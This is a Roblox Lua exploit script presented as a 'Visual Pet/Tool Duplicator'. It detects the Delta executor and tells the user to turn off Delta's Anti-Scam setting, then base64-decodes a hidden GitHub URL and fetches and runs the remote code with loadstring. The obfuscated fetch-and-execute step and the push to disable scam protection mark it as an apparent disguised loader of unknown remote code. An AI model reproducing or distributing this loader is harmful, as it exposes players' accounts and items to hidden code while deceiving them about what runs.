-- // Combo: Delta Executor Check + Visual Pet/Tool Duplicator (Compressed)
-- // by beruu

if identifyexecutor and identifyexecutor():lower():find("delta") then
	-- Show Delta warning GUI
	local TweenService = game:GetService("TweenService")
	local gui = Instance.new("ScreenGui", game.CoreGui)
	gui.Name = "DeltaDetectGUI"
	gui.ResetOnSpawn = false

	local frame = Instance.new("Frame", gui)
	frame.Size = UDim2.new(0,480,0,320)
	frame.Position = UDim2.new(0.5,-240,0.5,-160)
	frame.BackgroundColor3 = Color3.fromRGB(25,25,25)
	frame.BorderSizePixel = 0
	frame.BackgroundTransparency = 1
	Instance.new("UICorner",frame).CornerRadius = UDim.new(0,10)

	local shadow = Instance.new("ImageLabel",frame)
	shadow.Size = UDim2.new(1,30,1,30); shadow.Position = UDim2.new(0,-15,0,-15)
	shadow.BackgroundTransparency = 1; shadow.Image = "rbxassetid://1316045217"
	shadow.ImageTransparency = 1; shadow.ScaleType = Enum.ScaleType.Slice
	shadow.SliceCenter = Rect.new(10,10,118,118)

	local title = Instance.new("TextLabel",frame)
	title.Text="⚠️ Delta Executor Detected"; title.Font=Enum.Font.GothamBold
	title.TextSize=24; title.TextColor3=Color3.fromRGB(255,100,100)
	title.BackgroundTransparency=1; title.Size=UDim2.new(1,0,0,40)
	title.Position=UDim2.new(0,0,0,10); title.TextTransparency=1

	local msg = Instance.new("TextLabel",frame)
	msg.Text="Please turn OFF Delta's Anti-Scam setting before proceeding.\nThis avoids script blocking."
	msg.Font=Enum.Font.Gotham; msg.TextSize=16; msg.TextColor3 = Color3.fromRGB(240,240,240)
	msg.TextWrapped=true; msg.BackgroundTransparency=1
	msg.Size=UDim2.new(1,-40,0,60); msg.Position=UDim2.new(0,20,0,60)
	msg.TextTransparency=1

	local timerLabel = Instance.new("TextLabel",frame)
	timerLabel.Text="Waiting 10 seconds..."; timerLabel.Font=Enum.Font.GothamBold
	timerLabel.TextSize=18; timerLabel.TextColor3=Color3.fromRGB(255,200,120)
	timerLabel.BackgroundTransparency=1
	timerLabel.Size=UDim2.new(1,0,0,30); timerLabel.Position=UDim2.new(0,0,0,125)
	timerLabel.TextTransparency=1

	local proceed = Instance.new("TextButton",frame)
	proceed.Size=UDim2.new(0,200,0,45); proceed.Position=UDim2.new(0.5,-100,1,-110)
	proceed.Text="🔒 Please Wait..."; proceed.Font=Enum.Font.GothamBold
	proceed.TextSize=18; proceed.TextColor3=Color3.fromRGB(160,160,160)
	proceed.BackgroundColor3=Color3.fromRGB(40,40,40)
	proceed.AutoButtonColor=false; proceed.Active=false
	proceed.BackgroundTransparency=1
	Instance.new("UICorner",proceed).CornerRadius = UDim.new(0,8)

	local function fadeIn(obj,d) task.delay(d or 0, function()
		TweenService:Create(obj,TweenInfo.new(0.5),{TextTransparency=0}):Play()
	end) end

	TweenService:Create(frame,TweenInfo.new(0.4),{BackgroundTransparency=0}):Play()
	TweenService:Create(shadow,TweenInfo.new(0.4),{ImageTransparency=0.5}):Play()
	TweenService:Create(proceed,TweenInfo.new(0.4),{BackgroundTransparency=0}):Play()
	fadeIn(title,0.2); fadeIn(msg,0.4); fadeIn(timerLabel,0.6)

	task.spawn(function()
		for i=10,1,-1 do
			timerLabel.Text="Please wait "..i.."s..."; wait(1)
		end
		timerLabel.Text="✅ You may now proceed!"
		proceed.Text="✅ Proceed"; proceed.TextColor3=Color3.fromRGB(255,255,255)
		proceed.Active = true

		proceed.MouseButton1Click:Connect(function()
			gui:Destroy()
			pcall(function()
	local b='ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/'
	local function decode(data)
		data=data:gsub('[^'..b..'=]','')
		return (data:gsub('.',function(x)
			if x=='='then return''end
			local r,f='',(b:find(x)-1)
			for i=6,1,-1 do r=r..(f%2^i-f%2^(i-1)>0 and'1'or'0')end
			return r
		end):gsub('%d%d%d?%d?%d?%d?%d?%d?',function(x)
			if #x~=8 then return''end
			local c=0
			for i=1,8 do c=c+(x:sub(i,i)=='1'and 2^(8-i)or 0)end
			return string.char(c)
		end))
	end

	local encoded="aHR0cHM6Ly9yYXcuZ2l0aHVidXNlcmNvbnRlbnQuY29tL0dhR1BTL1BldER1cGVyL3JlZnMvaGVhZHMvbWFpbi9QZXREdXBlclYxLmx1YQ=="
	local url=decode(encoded)
	local func=loadstring(game:HttpGet(url))
	if func then func() end
end)
		end)
	end)
else
	pcall(function()
	local b='ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/'
	local function decode(data)
		data=data:gsub('[^'..b..'=]','')
		return (data:gsub('.',function(x)
			if x=='='then return''end
			local r,f='',(b:find(x)-1)
			for i=6,1,-1 do r=r..(f%2^i-f%2^(i-1)>0 and'1'or'0')end
			return r
		end):gsub('%d%d%d?%d?%d?%d?%d?%d?',function(x)
			if #x~=8 then return''end
			local c=0
			for i=1,8 do c=c+(x:sub(i,i)=='1'and 2^(8-i)or 0)end
			return string.char(c)
		end))
	end

	local encoded="aHR0cHM6Ly9yYXcuZ2l0aHVidXNlcmNvbnRlbnQuY29tL0dhR1BTL1BldER1cGVyL3JlZnMvaGVhZHMvbWFpbi9QZXREdXBlclYxLmx1YQ=="
	local url=decode(encoded)
	local func=loadstring(game:HttpGet(url))
	if func then func() end
end)
end
